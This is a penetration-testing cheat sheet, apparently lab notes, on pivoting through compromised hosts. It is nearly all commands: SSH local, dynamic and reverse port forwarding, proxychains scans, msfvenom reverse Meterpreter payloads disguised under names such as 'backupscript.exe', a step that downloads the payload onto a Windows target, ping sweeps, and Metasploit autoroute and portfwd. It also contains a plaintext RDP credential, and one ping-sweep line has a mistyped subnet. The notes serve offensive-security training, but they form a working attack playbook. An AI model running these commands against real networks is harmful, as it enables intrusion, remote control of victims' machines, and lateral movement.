
# Dynamic Port Forwarding with SSH and SOCKS5 Tunneling 
---
Local port forward with ssh:
```shell
ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
```

Confirm port forward with netstat:
```shell
netstat -antp | grep 1234
```

Enable dynamic port forwarding with ssh;
```shell
ssh -D 9050 ubuntu@10.129.202.64
```

Nmap with proxychains:
```shell
proxychains nmap -v -sn 172.16.5.1-200
```

Metasploit with proxychains:
```shell
proxychains msfconsole
```

RDP with proxychains:
```shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

# Remote/Reverse Port Forwarding with SSH
---
Creating windows payload with msfvenom:
```shell
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

Setup multi/handler:
```shell
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
```

Transfer payload to pivot host:
```shell
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

Download payload from windows target:
```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Remote port-forward using ssh -R:
```shell
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

# Meterpreter Tunneling & Port Forwarding
---
Creating linux payload with msfvenom:
```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

Ping sweep on linux host:
```shell
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

Ping sweep on windows host (cmd):
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

Ping sweep on windows host (ps):
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

Setup metasploit socks proxy:
```shell
use auxiliary/server/socks_proxy
set version 4a
```

Confirm proxy is running:
```shell
jobs
```

Create route with metasploit's AutoRoute:
```shell
use post/multi/manage/autoroute
```

Create route from meterpreter session:
```shell
run autoroute -s 172.16.5.0/23
```

List routes from meterpreter session:
```shell
run autoroute -p
```

Create TCP relay with meterpreter portfwd:
```shell
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

